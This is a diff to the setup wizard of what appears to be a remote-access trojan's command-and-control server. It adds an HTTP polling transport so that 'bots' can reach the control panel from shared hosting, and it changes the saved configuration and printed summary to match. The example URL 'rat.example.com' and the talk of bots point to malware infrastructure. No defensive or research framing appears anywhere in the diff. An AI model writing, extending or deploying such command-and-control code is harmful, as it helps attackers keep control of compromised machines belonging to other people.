@@ -130,11 +130,33 @@ def run_wizard() -> dict:
 
     print()
     print(_c("  C2 (bot) channel", BOLD))
-    c2_bind = ask("  Bind address (where the C2 listens)",
-                  existing.get("c2", {}).get("bind", "0.0.0.0"))
-    c2_host = ask("  Address the bots connect to",
-                  existing.get("c2", {}).get("host", c2_bind))
-    c2_port = ask_int("  C2 port", int(existing.get("c2", {}).get("port", 8777)))
+    print()
+    print("    [1] Direct TCP   the server owns a port, bots connect straight to it")
+    print("    [2] HTTP         shared hosting: the bots poll the panel over HTTP")
+    print()
+    transport = "tcp"
+    if existing.get("c2", {}).get("transport") == "http":
+        transport = "http"
+    while True:
+        pick = ask("  Transport", "2" if transport == "http" else "1")
+        if pick in ("1", "2"):
+            transport = "tcp" if pick == "1" else "http"
+            break
+        print(_c("  ! choose 1 or 2", YELLOW))
+    print(_c("  -> " + ("HTTP polling (shared hosting)" if transport == "http"
+                        else "Direct TCP"), GREEN))
+
+    if transport == "http":
+        c2_bind = "127.0.0.1"
+        c2_host = ask("  Public URL of the panel (e.g. https://rat.example.com)",
+                      existing.get("c2", {}).get("host", "http://127.0.0.1:8080"))
+        c2_port = int(existing.get("c2", {}).get("port", 8777))
+    else:
+        c2_bind = ask("  Bind address (where the C2 listens)",
+                      existing.get("c2", {}).get("bind", "0.0.0.0"))
+        c2_host = ask("  Address the bots connect to",
+                      existing.get("c2", {}).get("host", c2_bind))
+        c2_port = ask_int("  C2 port", int(existing.get("c2", {}).get("port", 8777)))
 
     protocol = ask("  Transport [tcp/tls]", existing.get("c2", {}).get("protocol", "tcp")).lower()
     if protocol not in ("tcp", "tls"):
@@ -155,6 +177,7 @@ def run_wizard() -> dict:
             "host": c2_host,
             "port": c2_port,
             "protocol": protocol,
+            "transport": transport,
             "cert": cert,
             "key": key,
         },
@@ -212,8 +235,12 @@ def print_summary(cfg: dict, path: str = ""):
     print(_c("+---------------------------------------------------------------+", GREEN))
     print()
     print(f"  Interface      : {'Web interface' if cfg.get('mode') == 'web' else 'Bot interface'}")
-    print(f"  C2 listen      : {c2.get('bind','0.0.0.0')}:{c2.get('port')} ({c2.get('protocol')})")
-    print(f"  Bots connect to: {c2.get('host')}:{c2.get('port')}")
+    if c2.get("transport") == "http":
+        print("  Transport      : HTTP polling (shared hosting)")
+        print(f"  Bots connect to: {c2.get('host')}")
+    else:
+        print(f"  C2 listen      : {c2.get('bind','0.0.0.0')}:{c2.get('port')} ({c2.get('protocol')})")
+        print(f"  Bots connect to: {c2.get('host')}:{c2.get('port')}")
     print(f"  Shared secret  : {secret}")
     if cfg.get("mode") == "web":
         print(f"  Panel URL      : http://{web.get('host')}:{web.get('port')}/")
